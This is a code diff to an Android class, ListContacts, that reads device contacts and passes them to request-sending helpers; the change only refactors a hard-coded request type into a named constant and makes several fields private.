@@ -22,6 +22,7 @@ import android.provider.ContactsContract.CommonDataKinds.Im;
 import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
 import android.util.Base64;
 
+import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
 
@@ -32,8 +33,7 @@ import com.inet.android.utils.Logging;
  * 
  */
 public class ListContacts extends AsyncTask<Context, Void, Void> {
-	Context mContext;
-	private String iType = "3";
+	private Context mContext;
 	private ArrayList<String> email = null;
 	private ArrayList<String> emailType = null;
 	private ArrayList<CharSequence> CustomemailType = null;
@@ -41,8 +41,8 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 	private String LOG_TAG = ListContacts.class.getSimpleName().toString();
 	private String complete;
 	private String version;
-	int imType;
-	int type;
+	private int imType;
+	private int type;
 
 	public void readContacts() throws JSONException {
 		Logging.doLog(LOG_TAG, "readContact", "readContact");
@@ -328,7 +328,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 
 		} else {
 			Logging.doLog(LOG_TAG, "else connect", "else connect");
-			TurnSendList.setList(iType, version, "0", mContext);
+			TurnSendList.setList(ConstantRequest.TYPE_LIST_CONTACTS_REQUEST, version, "0", mContext);
 		}
 	}
 
@@ -340,7 +340,7 @@ public class ListContacts extends AsyncTask<Context, Void, Void> {
 	private void sendRequest(String str, String complete) {
 		Logging.doLog(LOG_TAG, "sendRequest: complete " + complete,
 				"sendRequest: complete " + complete);
-		RequestList.sendDemandRequest(str, iType, complete, version, mContext);
+		RequestList.sendDemandRequest(str, ConstantRequest.TYPE_LIST_CONTACTS_REQUEST, complete, version, mContext);
 	}
 
 	private String getTipe(int phonetype) {
